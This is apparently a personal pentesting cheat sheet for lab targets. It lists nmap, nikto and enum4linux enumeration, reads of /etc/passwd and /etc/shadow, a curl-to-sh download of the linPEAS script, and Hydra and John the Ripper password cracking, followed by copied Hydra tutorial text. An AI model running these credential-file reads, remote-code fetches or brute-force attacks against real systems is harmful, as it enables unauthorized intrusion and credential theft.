# Kali  

## Enum
Nmap  
```
Works better with `sudo`...  
# TCP SYN Scan: Get the list of live hosts and associated ports on the hosts without completing the TCP three-way handshake. #stealthier
nmap -sS 10.10.224.22
# Ping Scan: Allows scanning the live hosts in the network without going deeper and checking for ports services etc.
nmap -sn 10.10.224.227
# Operating System Scan: Allows scanning of the type of OS running on a live host.
nmap -O 10.10.224.227
# Detecting Services: Get a list of running services on a live host.
nmap -sV 10.10.224.22
```  
Nikto  
`nikto -host 10.10.224.227`

- Layer 7
```
# Gobuster
```

```sh
#enum4linux
/opt/enum4linux/enum4linux.pl -a $target_ip | tee enum4linux.log
```

```sh
# Basic poking around
cat /etc/passwd /etc/shadow
compgen -A function -abck
```
[Linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
  - `curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh`


## Password Cracking
`/usr/share/wordlists/rockyou.txt`  
```sh
# Hydra
hydra -l $username -P /opt/rockyou.txt ssh://$target_ip
```
```sh
#Jonh the Ripper
/opt/JohnTheRipper/run/ssh2john.py $rsakeyfilepath > forjohn.txt
/opt/JohnTheRipper/run/john --wordlist=/opt/rockyou.txt
```


We want an automated way to try the common passwords or the entries from a word list; here comes THC Hydra. Hydra supports many protocols, including SSH, VNC, FTP, POP3, IMAP, SMTP, and all methods related to HTTP. You can learn more about THC Hydra by joining the Hydra room. The general command-line syntax is the following:

`hydra -l username -P wordlist.txt server service` where we specify the following options:

-l username: -l should precede the username, i.e. the login name of the target. You should omit this option if the service does not use a username.
-P wordlist.txt: -P precedes the wordlist.txt file, which contains the list of passwords you want to try with the provided username.
server is the hostname or IP address of the target server.
service indicates the service in which you are trying to launch the dictionary attack.
Consider the following concrete examples:

hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.224.227 ssh will use mark as the username as it iterates over the provided passwords against the SSH server.
hydra -l mark -P /usr/share/wordlists/rockyou.txt ssh://10.10.224.227 is identical to the previous example. 10.10.224.227 ssh is the same as ssh://10.10.224.227.
You can replace ssh with another protocol name, such as rdp, vnc, ftp, pop3 or any other protocol supported by Hydra.

There are some extra optional arguments that you can add:

-V or -vV, for verbose, makes Hydra show the username and password combinations being tried. This verbosity is very convenient to see the progress, especially if you still need to be more confident in your command-line syntax.
-d, for debugging, provides more detailed information about what’s happening. The debugging output can save you much frustration; for instance, if Hydra tries to connect to a closed port and timing out, -d will reveal this immediately.
In the terminal window below, we use Hydra to find the password of the username alexander that allows access via SSH.